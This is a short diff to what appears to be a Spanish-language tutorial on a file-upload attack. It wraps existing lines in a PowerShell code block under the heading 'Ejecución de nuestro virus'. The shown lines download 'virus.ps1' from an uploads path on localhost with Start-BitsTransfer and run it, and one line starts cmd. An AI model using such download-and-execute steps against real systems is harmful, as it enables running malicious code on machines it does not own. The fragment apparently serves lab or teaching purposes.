@@ -92,6 +92,7 @@ if ($uploadOk == 0) {
 Start-Proccess cmd
 ```
 # Ejecución de nuestro virus
+```powershell
 Start-BitsTransfer -Source 'https://localhost/uploads/virus.ps1'
-
 .\virus.ps1
+```
